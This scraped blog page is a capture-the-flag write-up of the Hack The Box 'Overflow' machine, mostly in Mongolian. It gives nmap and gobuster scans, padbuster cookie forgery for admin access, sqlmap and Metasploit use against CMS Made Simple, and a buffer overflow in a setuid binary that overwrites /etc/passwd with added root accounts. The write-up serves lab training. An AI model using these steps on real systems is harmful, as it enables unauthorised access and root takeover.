mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false developer:x:1001:1001::/home/developer:/bin/sh sshd:x:109:65534::/run/sshd:/usr/sbin/nologin root5:KWi2XW05LmkMg:0:0:root:/root:/bin/bash dambo::0:0:root:/root:/bin/bash encrypt -\u003e passwd\n#!/usr/bin/python3 source = open('/tmp/passwd', 'rb').read() dest = open('/tmp/passwd2', 'wb') for i in source: dest.write(bytes([i ^ 0x9b])) -rw-rw-r-- 1 tester tester 148 Mar 21 15:45 encrypt.py -rw-r--r-- 1 tester tester 1.7K Mar 21 15:39 passwd python3 encrypt.py -rw-rw-r-- 1 tester tester 1.7K Mar 21 15:45 passwd2 tester@overflow:/opt/file_encrypt$ ./file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Enter Input File: /tmp/passwd2 Enter Encrypted File: /etc/passwd Segmentation fault (core dumped) tester@overflow:/opt/file_encrypt$ cat /ect/passwd #### postfix:x:111:116::/var/spool/postfix:/usr/sbin/nologin mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false developer:x:1001:1001::/home/developer:/bin/sh sshd:x:109:65534::/run/sshd:/usr/sbin/nologin root5:KWi2XW05LmkMg:0:0:root:/root:/bin/bash dambo::0:0:root:/root:/bin/bash openssl passwd -1 testing $1$WoRrIRT4$aVl7dx43e4Grq0yh5J78c0 ### echo \"batman:$1$WoRrIRT4$aVl7dx43e4Grq0yh5J78c0:0:0:root:/root:/bin/bash\" \u003e\u003e /tmp/passwd openssl password generate хийх гэхээр орохгүй байна…\nroot2:testing\necho root2:KWi2XW05LmkMg:0:0:root:/root:/bin/bash \u003e\u003e /tmp/passwd Root.txt\n49f84c69a7******* ","wordCount":"2657","inLanguage":"mn","datePublished":"2024-03-07T00:00:00Z","dateModified":"2024-03-07T00:00:00Z","author":{"@type":"Person","name":"CaDiL"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://cadil.github.io/posts/2024-03-07-htb-overflow-writeup/"},"publisher":{"@type":"Organization","name":"CaDiL's Blog","logo":{"@type":"ImageObject","url":"https://cadil.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://cadil.github.io/ accesskey=h title="CaDiL's Blog (Alt + H)">CaDiL's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://cadil.github.io/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://cadil.github.io/bookmark/ title=Bookmark><span>Bookmark</span></a></li><li><a href=https://cadil.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://cadil.github.io/using/ title=Using><span>Using</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://cadil.github.io/>Нүүр</a>&nbsp;»&nbsp;<a href=https://cadil.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">HTB - Overflow</h1><div class=post-description>HTB - Overflow - Writeup /Mostly Notes/</div><div class=post-meta><span title='2024-03-07 00:00:00 +0000 UTC'>гуравдугаар сар 7, 2024</span>&nbsp;·&nbsp;13 МИН&nbsp;·&nbsp;CaDiL</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Агуулга</span></summary><div class=inner><ul><li><a href=#1-ip-address aria-label="1. IP Address">1. IP Address</a></li><li><a href=#2-nmap aria-label="2. Nmap">2. Nmap</a></li><li><a href=#3-gobuster aria-label="3. Gobuster">3. Gobuster</a></li><li><a href=#4-sql-truncation aria-label="4. SQL Truncation">4. SQL Truncation</a><ul><li><a href=#41-padbuster aria-label="4.1 Padbuster">4.1 Padbuster</a></li></ul></li><li><a href=#5-cms-made-simple aria-label="5. CMS Made Simple">5. CMS Made Simple</a><ul><li><a href=#51-msfconsole aria-label="5.1 msfconsole">5.1 msfconsole</a></li></ul></li><li><a href=#6-sqlmap aria-label="6. SQLMap">6. SQLMap</a><ul><li><a href=#61-hashcat aria-label="6.1 Hashcat">6.1 Hashcat</a></li><li><a href=#62-msfconsole-with-exiftool aria-label="6.2 Msfconsole with exiftool">6.2 Msfconsole with exiftool</a></li><li><a href=#63-nc-with-shell-balance aria-label="6.3 nc with shell balance">6.3 nc with shell balance</a></li></ul></li><li><a href=#7-exploitation aria-label="7. Exploitation">7. Exploitation</a></li><li><a href=#8-enumeration aria-label="8. Enumeration">8. Enumeration</a><ul><li><a href=#81-ssh aria-label="8.1 ssh">8.1 ssh</a></li><li><a href=#82-file_encrypt aria-label="8.2 file_encrypt">8.2 file_encrypt</a></li><li><a href=#83-ghidra aria-label="8.3 Ghidra">8.3 Ghidra</a></li><li><a href=#84-gdb aria-label="8.4 gdb">8.4 gdb</a></li><li><a href=#85-pattern_createrb aria-label="8.5 pattern_create.rb">8.5 pattern_create.rb</a></li><li><a href=#86-pattern_offsetrb aria-label="8.6 pattern_offset.rb">8.6 pattern_offset.rb</a></li><li><a href=#87-root-user-%d2%af%d2%af%d1%81%d0%b3%d1%8d%d1%85 aria-label="8.7 Root user үүсгэх">8.7 Root user үүсгэх</a></li></ul></li></ul></div></details></div><div class=post-content><h3 id=1-ip-address>1. IP Address<a hidden class=anchor aria-hidden=true href=#1-ip-address>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Machine Address</span>
</span></span><span style=display:flex><span>10.10.11.136
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Local Address</span>
</span></span><span style=display:flex><span>10.10.14.4
</span></span></code></pre></div><h3 id=2-nmap>2. Nmap<a hidden class=anchor aria-hidden=true href=#2-nmap>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -sV -sC -oA nmap/overflow 10.10.11.119
</span></span></code></pre></div><p>Out:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-02-27 01:01 EST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.119
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.24s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>997</span> closed ports
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>25/tcp open  smtp    Postfix smtpd
</span></span><span style=display:flex><span>|_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.29 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: Overflow Sec
</span></span><span style=display:flex><span>Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 65.74 seconds
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -sU -sV -sC 10.10.11.119 --min-rate <span style=color:#ae81ff>7500</span> -F
</span></span></code></pre></div><p>Out:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.119
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.24s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>94</span> open|filtered ports
</span></span><span style=display:flex><span>PORT      STATE  SERVICE      VERSION
</span></span><span style=display:flex><span>497/udp   closed retrospect
</span></span><span style=display:flex><span>1026/udp  closed win-rpc
</span></span><span style=display:flex><span>1646/udp  closed radacct
</span></span><span style=display:flex><span>1719/udp  closed h323gatestat
</span></span><span style=display:flex><span>33281/udp closed unknown
</span></span><span style=display:flex><span>49156/udp closed unknown
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 683.43 seconds
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -sU -top-ports<span style=color:#f92672>=</span><span style=color:#ae81ff>20</span> overflow.htb
</span></span></code></pre></div><p>Out:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-02-27 02:34 EST
</span></span><span style=display:flex><span>Stats: 0:00:04 elapsed; <span style=color:#ae81ff>0</span> hosts completed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> up<span style=color:#f92672>)</span>, <span style=color:#ae81ff>1</span> undergoing UDP Scan
</span></span><span style=display:flex><span>UDP Scan Timing: About 80.00% <span style=color:#66d9ef>done</span>; ETC: 02:35 <span style=color:#f92672>(</span>0:00:01 remaining<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> overflow.htb <span style=color:#f92672>(</span>10.10.11.119<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.25s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE         SERVICE
</span></span><span style=display:flex><span>53/udp    closed        domain
</span></span><span style=display:flex><span>67/udp    open|filtered dhcps
</span></span><span style=display:flex><span>68/udp    closed        dhcpc
</span></span><span style=display:flex><span>69/udp    closed        tftp
</span></span><span style=display:flex><span>123/udp   closed        ntp
</span></span><span style=display:flex><span>135/udp   open|filtered msrpc
</span></span><span style=display:flex><span>137/udp   closed        netbios-ns
</span></span><span style=display:flex><span>138/udp   closed        netbios-dgm
</span></span><span style=display:flex><span>139/udp   closed        netbios-ssn
</span></span><span style=display:flex><span>161/udp   closed        snmp
</span></span><span style=display:flex><span>162/udp   closed        snmptrap
</span></span><span style=display:flex><span>445/udp   closed        microsoft-ds
</span></span><span style=display:flex><span>500/udp   open|filtered isakmp
</span></span><span style=display:flex><span>514/udp   closed        syslog
</span></span><span style=display:flex><span>520/udp   closed        route
</span></span><span style=display:flex><span>631/udp   closed        ipp
</span></span><span style=display:flex><span>1434/udp  closed        ms-sql-m
</span></span><span style=display:flex><span>1900/udp  closed        upnp
</span></span><span style=display:flex><span>4500/udp  closed        nat-t-ike
</span></span><span style=display:flex><span>49152/udp closed        unknown
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -p- --min-rate <span style=color:#ae81ff>10000</span> -oA scans/nmap-alltcp 10.10.11.119
</span></span><span style=display:flex><span>nmap -p 22,25,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.119
</span></span></code></pre></div><h3 id=3-gobuster>3. Gobuster<a hidden class=anchor aria-hidden=true href=#3-gobuster>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gobuster dir -u http://overflow.htb -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></code></pre></div><p>Out:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.1.0
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://overflow.htb
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/02/27 01:26:34 Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/home                 <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 311<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://overflow.htb/home/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/assets               <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 313<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://overflow.htb/assets/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/config               <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 313<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://overflow.htb/config/<span style=color:#f92672>]</span>
</span></span></code></pre></div><p><code>/config</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gobuster dir -u http://overflow.htb/config -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php
</span></span></code></pre></div><p>Хэрэгтэй зүйл байгаагүй.</p><h3 id=4-sql-truncation>4. SQL Truncation<a hidden class=anchor aria-hidden=true href=#4-sql-truncation>#</a></h3><p>Эхлээд <code>admin</code>-нэртэй user давхар үүсгээд cookie авах гэсэн, болоогүй. Admin араас <code>45 удаа зай</code> аваад үзэхээр болоогүй, admin өмнө нь нэг зай аваад гарсан cookie:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GET /home/index.php HTTP/1.1
</span></span><span style=display:flex><span>Host: overflow.htb
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; rv:78.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/78.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Referer: http://overflow.htb/register.php
</span></span><span style=display:flex><span>DNT: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Cookie: auth<span style=color:#f92672>=</span>%2FoVZR9sAqmC53eoXs2m0%2BJkzW6wotphC
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span></code></pre></div><h4 id=41-padbuster>4.1 Padbuster<a hidden class=anchor aria-hidden=true href=#41-padbuster>#</a></h4><p>digging хийж байгаад <code>padbuster</code> -р cookie авах болсон
padbuster</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>padbuster http://overflow.htb/login.php soVMzOVc6tujv2WuGlrUk%2F8reumdJbOp <span style=color:#ae81ff>8</span> -cookie auth<span style=color:#f92672>=</span>soVMzOVc6tujv2WuGlrUk%2F8reumdJbOp -plaintext user<span style=color:#f92672>=</span>admin
</span></span></code></pre></div><p>Out:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
</span></span><span style=display:flex><span>-------------------------------------------------------
</span></span><span style=display:flex><span>** Finished ***
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
</span></span><span style=display:flex><span>-------------------------------------------------------
</span></span></code></pre></div><p><a href=http://overflow.htb/admin_cms_panel/admin/login.php>http://overflow.htb/admin_cms_panel/admin/login.php</a></p><h3 id=5-cms-made-simple>5. CMS Made Simple<a hidden class=anchor aria-hidden=true href=#5-cms-made-simple>#</a></h3><p><a href=http://overflow.htb/admin_cms_panel/admin/>http://overflow.htb/admin_cms_panel/admin/</a></p><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gobuster dir -u http://overflow.htb/admin_cms_panel/admin -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php
</span></span></code></pre></div><p>out:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Gobuster v3.1.0
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://overflow.htb/admin_cms_panel/admin
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Extensions:              php
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/03/12 07:19:41 Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/index.php            <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://overflow.htb/admin_cms_panel/admin/login.php<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/login.php            <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 4816<span style=color:#f92672>]</span>                                                       
</span></span><span style=display:flex><span>/templates            <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 338<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://overflow.htb/admin_cms_panel/admin/templates/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/themes               <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 335<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://overflow.htb/admin_cms_panel/admin/themes/<span style=color:#f92672>]</span>   
</span></span><span style=display:flex><span>/header.php           <span style=color:#f92672>(</span>Status: 500<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span>                                                             
</span></span><span style=display:flex><span>/footer.php           <span style=color:#f92672>(</span>Status: 500<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span>                                                             
</span></span><span style=display:flex><span>/plugins              <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 336<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://overflow.htb/admin_cms_panel/admin/plugins/<span style=color:#f92672>]</span>  
</span></span><span style=display:flex><span>/style.php            <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 53969<span style=color:#f92672>]</span>                                                         
</span></span><span style=display:flex><span>/lang                 <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 333<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://overflow.htb/admin_cms_panel/admin/lang/<span style=color:#f92672>]</span>     
</span></span><span style=display:flex><span>/logout.php           <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://overflow.htb/admin_cms_panel/admin/login.php<span style=color:#f92672>]</span>   
</span></span><span style=display:flex><span>/myaccount.php        <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://overflow.htb/admin_cms_panel/admin/login.php<span style=color:#f92672>]</span>                                                                          
</span></span><span style=display:flex><span>                                                                                                          
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/03/12 07:26:16 Finished
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span></code></pre></div><p>онцгой зүйл алга. одоогоор&mldr;</p><p><a href=http://overflow.htb/admin_cms_panel/doc/CHANGELOG.txt>http://overflow.htb/admin_cms_panel/doc/CHANGELOG.txt</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>Version 2.2.8 - Flin Flon
</span></span></code></pre></div><p>burp out:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GET /admin_cms_panel/admin/login.php HTTP/1.1
</span></span><span style=display:flex><span>Host: overflow.htb
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; rv:78.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/78.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>DNT: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Cookie: auth<span style=color:#f92672>=</span>BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA; CMSSESSIDf25decdf38ae<span style=color:#f92672>=</span>i1qs15u63sha9jh7a9c7s7ag10
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -r login.req --level <span style=color:#ae81ff>5</span> --risk <span style=color:#ae81ff>3</span> --threads <span style=color:#ae81ff>10</span>
</span></span></code></pre></div><h4 id=51-msfconsole>5.1 msfconsole<a hidden class=anchor aria-hidden=true href=#51-msfconsole>#</a></h4><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Matching Modules
</span></span><span style=display:flex><span><span style=color:#f92672>================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   <span style=color:#75715e>#  Name                                           Disclosure Date  Rank    Check  Description</span>
</span></span><span style=display:flex><span>   -  ----                                           ---------------  ----    -----  -----------
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>  exploit/multi/http/cmsms_object_injection_rce  2019-03-26       normal  Yes    CMS Made Simple Authenticated RCE via object injection
</span></span></code></pre></div><p>дээрх болоогүй, <code>python2</code>, bound хийж байгаа нь таарахгүй.</p><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo apt update <span style=color:#f92672>&amp;&amp;</span> sudo apt -y install exploitdb
